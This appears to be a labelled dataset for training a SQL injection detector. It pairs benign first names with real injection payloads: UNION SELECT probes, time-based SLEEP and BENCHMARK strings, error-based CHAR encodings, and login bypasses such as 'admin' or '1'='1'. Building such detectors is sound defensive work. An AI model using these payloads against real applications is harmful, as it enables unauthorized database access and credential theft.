"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))--'",SQL Injection
'WHERE 1=1 AND 1=1#',SQL Injection
"'"""" or """"""""*""""'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--'",SQL Injection
'Alice',Normal
'Fran',Normal
'Hank',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))--'",SQL Injection
'Alice',Normal
'Alice',Normal
'John',Normal
'Bob',Normal
'Eve',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#'",SQL Injection
'David',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))'",SQL Injection
'Charlie',Normal
'UNION ALL SELECT 1',SQL Injection
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#'",SQL Injection
'David',Normal
'Fran',Normal
'Charlie',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'",SQL Injection
'Bob',Normal
'Jill',Normal
'OR x=x',SQL Injection
''));,SQL Injection
'Fran',Normal
'John',Normal
'Eve',Normal
'Eve',Normal
'Fran',Normal
'1 or sleep(5)#',SQL Injection
'Hank',Normal
'David',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))'",SQL Injection
'AS INJECTX WHERE 1=1 AND 1=1--',SQL Injection
'John',Normal
'David',Normal
'John',Normal
'Grace',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#'",SQL Injection
'Eve',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#'",SQL Injection
'Charlie',Normal
'Jill',Normal
'Charlie',Normal
'or SLEEP(5)#',SQL Injection
'John',Normal
'ORDER BY 1--',SQL Injection
"'SLEEP(1)/*' or SLEEP(1) or '"""" or SLEEP(1) or """"*/'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'",SQL Injection
'ORDER BY 25#',SQL Injection
'AND 7300=7300 AND 'pKlZ'='pKlY',SQL Injection
'Fran',Normal
'David',Normal
'John',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--'",SQL Injection
'Fran',Normal
"'-1 UNION SELECT 1 INTO @,@,@'",SQL Injection
'ORDER BY 13#',SQL Injection
'Grace',Normal
'Hank',Normal
'AND 1=0#',SQL Injection
'Hank',Normal
'Alice',Normal
'WHERE 1=1 AND 1=0#',SQL Injection
'Jill',Normal
'Hank',Normal
'ORDER BY 6',SQL Injection
'Fran',Normal
';',SQL Injection
'ORDER BY 7',SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'",SQL Injection
'Alice',Normal
'RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='',SQL Injection
"'or benchmark(50000000,MD5(1))--'",SQL Injection
'Charlie',Normal
'John',Normal
'David',Normal
'David',Normal
'AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'",SQL Injection
'Hank',Normal
'David',Normal
'Grace',Normal
'Bob',Normal
'Fran',Normal
'David',Normal
'Eve',Normal
'Fran',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#'",SQL Injection
"'"""" or true--'",SQL Injection
'ORDER BY 24',SQL Injection
'Alice',Normal
'Grace',Normal
'Bob',Normal
'Eve',Normal
'Grace',Normal
'Fran',Normal
'John',Normal
'ORDER BY 9#',SQL Injection
'John',Normal
'David',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'",SQL Injection
'Hank',Normal
'Eve',Normal
'SLEEP(5)#',SQL Injection
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL--'",SQL Injection
'Eve',Normal
"'1234 """" AND 1=0 UNION ALL SELECT """"admin"""", """"81dc9bdb52d04dc20036dbd8313ed055'",SQL Injection
'Alice',Normal
"'UNION ALL SELECT USER(),SLEEP(5)--'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14'",SQL Injection
'Hank',Normal
'Eve',Normal
'Bob',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'",SQL Injection
'Hank',Normal
'Alice',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'",SQL Injection
'Hank',Normal
'Eve',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'David',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'",SQL Injection
'or 1=1',SQL Injection
'David',Normal
'%00',SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'",SQL Injection
'Bob',Normal
"'""""));",SQL Injection
'David',Normal
'Bob',Normal
'Grace',Normal
'WHERE 1=1 AND 1=1--',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12'",SQL Injection
'Eve',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'",SQL Injection
'John',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'",SQL Injection
'David',Normal
'David',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'",SQL Injection
'Bob',Normal
'ORDER BY 4#',SQL Injection
'') or ('x')=('x',SQL Injection
'Charlie',Normal
'Hank',Normal
'John',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'",SQL Injection
'pg_SLEEP(5)--',SQL Injection
'Alice',Normal
'Eve',Normal
'ORDER BY 30#',SQL Injection
'Jill',Normal
'John',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'",SQL Injection
'ORDER BY 23--',SQL Injection
'Charlie',Normal
'Grace',Normal
'Bob',Normal
'David',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'",SQL Injection
'Jill',Normal
'Grace',Normal
'Hank',Normal
'';,SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--'",SQL Injection
'Hank',Normal
'David',Normal
'Jill',Normal
'Eve',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#'",SQL Injection
'ORDER BY 20',SQL Injection
'Grace',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'",SQL Injection
'John',Normal
'Bob',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27'",SQL Injection
'John',Normal
'David',Normal
"'' UNION SELECT null, username, password FROM users --'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5'",SQL Injection
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'Jill',Normal
'Charlie',Normal
'David',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#'",SQL Injection
'Fran',Normal
'Hank',Normal
'Hank',Normal
'David',Normal
'Jill',Normal
'Grace',Normal
'Bob',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#'",SQL Injection
'David',Normal
'Grace',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))'",SQL Injection
'Alice',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'",SQL Injection
'Fran',Normal
'Jill',Normal
'AND 0',SQL Injection
'Bob',Normal
'Bob',Normal
"'"""");",SQL Injection
'or pg_SLEEP(5)',SQL Injection
'Hank',Normal
'David',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))--'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),""""'3'",SQL Injection
'Grace',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))--'",SQL Injection
'Alice',Normal
'David',Normal
'ORDER BY 8--',SQL Injection
"'and (select substring(@@version,3,1))='S''",SQL Injection
'Grace',Normal
"'SLEEP(1)/*' or SLEEP(1) or '"""" or SLEEP(1) or """"*/'",SQL Injection
'ORDER BY 22',SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#'",SQL Injection
'Eve',Normal
'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)',SQL Injection
'ORDER BY 30',SQL Injection
'Jill',Normal
'Eve',Normal
'Charlie',Normal
'Charlie',Normal
'''',SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'",SQL Injection
"'UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--'",SQL Injection
'Bob',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'Charlie',Normal
'ORDER BY 22',SQL Injection
'Jill',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'",SQL Injection
'Eve',Normal
'Grace',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7#'",SQL Injection
"'' UNION SELECT 1,2,3 --'",SQL Injection
'Jill',Normal
'Alice',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7#'",SQL Injection
'Eve',Normal
'admin' #',SQL Injection
'Eve',Normal
'Bob',Normal
'John',Normal
'or 1=1--',SQL Injection
'Hank',Normal
'ORDER BY 16--',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9'",SQL Injection
'John',Normal
'Jill',Normal
'SLEEP(5)--',SQL Injection
'Jill',Normal
'Jill',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18'",SQL Injection
'Fran',Normal
'Fran',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#'",SQL Injection
'Hank',Normal
'' UNION SELECT sum(columnname ) from tablename --',SQL Injection
'UNION ALL SELECT USER()--',SQL Injection
'John',Normal
'Eve',Normal
"'UNION ALL SELECT 1,2'",SQL Injection
'Grace',Normal
'Fran',Normal
'admin' or 1=1/*',SQL Injection
'Charlie',Normal
"'admin"""" or 1=1/*'",SQL Injection
"'UNION ALL SELECT 1,2#'",SQL Injection
'ORDER BY 17#',SQL Injection
"'+		addition, concatenate (or space in url)'",SQL Injection
'David',Normal
'Eve',Normal
'David',Normal
'Hank',Normal
'David',Normal
'Alice',Normal
''-'',SQL Injection
'Bob',Normal
'Alice',Normal
'Charlie',Normal
"'"""" or """"""""-""""'",SQL Injection
'John',Normal
'Alice',Normal
'John',Normal
'Alice',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'",SQL Injection
'Grace',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'",SQL Injection
'Bob',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14'",SQL Injection
'or pg_SLEEP(5)--',SQL Injection
'Jill',Normal
'John',Normal
'Hank',Normal
'Charlie',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'",SQL Injection
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'John',Normal
'Bob',Normal
'ORDER BY 15--',SQL Injection
'John',Normal
'Alice',Normal
'David',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'",SQL Injection
'John',Normal
'ORDER BY 10',SQL Injection
'John',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'",SQL Injection
'ORDER BY 22#',SQL Injection
'Eve',Normal
"'admin"""") or (""""1""""=""""1'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'",SQL Injection
'admin' or '1'='1',SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8--'",SQL Injection
'Bob',Normal
'AND 7300=7300 AND 'pKlZ'='pKlY',SQL Injection
'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--',SQL Injection
'Charlie',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12'",SQL Injection
'ORDER BY SLEEP(5)--',SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'",SQL Injection
"'""""'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--'",SQL Injection
"'admin"""") or """"1""""=""""1'",SQL Injection
'Charlie',Normal
'David',Normal
'Charlie',Normal
'Fran',Normal
"'-1 UNION SELECT 1 INTO @,@'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--'",SQL Injection
'Charlie',Normal
'Grace',Normal
"'+benchmark(3200,SHA1(1))+''",SQL Injection
"'admin"""" --'",SQL Injection
'ORDER BY 23',SQL Injection
"'AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))'",SQL Injection
'AND 0',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'",SQL Injection
''',SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8'",SQL Injection
'Alice',Normal
'John',Normal
'Charlie',Normal
'Jill',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))--'",SQL Injection
'#	    Hash comment',SQL Injection
'Fran',Normal
'' or sleep(5)='',SQL Injection
'David',Normal
'RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='',SQL Injection
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'Eve',Normal
'Hank',Normal
'Jill',Normal
'Fran',Normal
''));,SQL Injection
'Eve',Normal
'' AND id IS NULL; --',SQL Injection
'Alice',Normal
'Charlie',Normal
'Hank',Normal
'Charlie',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))--'",SQL Injection
'Grace',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8--'",SQL Injection
'John',Normal
'Eve',Normal
'Fran',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--'",SQL Injection
'Jill',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#'",SQL Injection
'Jill',Normal
'Grace',Normal
'Bob',Normal
'Bob',Normal
'Charlie',Normal
'Alice',Normal
'David',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))--'",SQL Injection
'SLEEP(5)='',SQL Injection
'Alice',Normal
'Hank',Normal
'ORDER BY 31337--',SQL Injection
'# from wapiti',SQL Injection
'Jill',Normal
'pg_sleep(5)--',SQL Injection
'David',Normal
'pg_SLEEP(5)',SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27'",SQL Injection
'David',Normal
'Charlie',Normal
'David',Normal
'Hank',Normal
'Bob',Normal
'Eve',Normal
'Fran',Normal
'John',Normal
"'ORDER BY 1,SLEEP(5)'",SQL Injection
'David',Normal
"'UNION SELECT @@VERSION,SLEEP(5),3'",SQL Injection
'Grace',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6--'",SQL Injection
'' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --',SQL Injection
'Eve',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--'",SQL Injection
'Grace',Normal
'John',Normal
'David',Normal
'AND 7300=7300 AND ('pKlZ'='pKlZ',SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))'",SQL Injection
''^'',SQL Injection
'Jill',Normal
'Bob',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10'",SQL Injection
'Charlie',Normal
'ORDER BY 6#',SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7--'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11'",SQL Injection
'Jill',Normal
'' AND EXISTS(SELECT * FROM users WHERE name = 'admin') --',SQL Injection
'Eve',Normal
'Fran',Normal
'Grace',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8'",SQL Injection
'Alice',Normal
'David',Normal
'Fran',Normal
'' or sleep(5)='',SQL Injection
'Eve',Normal
'Fran',Normal
'Grace',Normal
'Grace',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--'",SQL Injection
'Jill',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#'",SQL Injection
'Fran',Normal
'Jill',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14'",SQL Injection
'John',Normal
'AND 7300=7300 AND 'pKlZ'='pKlZ',SQL Injection
'Fran',Normal
'ORDER BY 7',SQL Injection
'' '',SQL Injection
'Grace',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'",SQL Injection
'UNION ALL SELECT 1',SQL Injection
'WHERE 1=1 AND 1=0#',SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11'",SQL Injection
'AND 1=1',SQL Injection
"'1 or benchmark(10000000,MD5(1))#'",SQL Injection
'Bob',Normal
'ORDER BY 9#',SQL Injection
'Alice',Normal
'David',Normal
'Charlie',Normal
'Fran',Normal
'John',Normal
'Hank',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'",SQL Injection
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'Hank',Normal
'`',SQL Injection
'Hank',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'John',Normal
'Bob',Normal
'John',Normal
'admin') or ('1'='1'--',SQL Injection
'Fran',Normal
'Eve',Normal
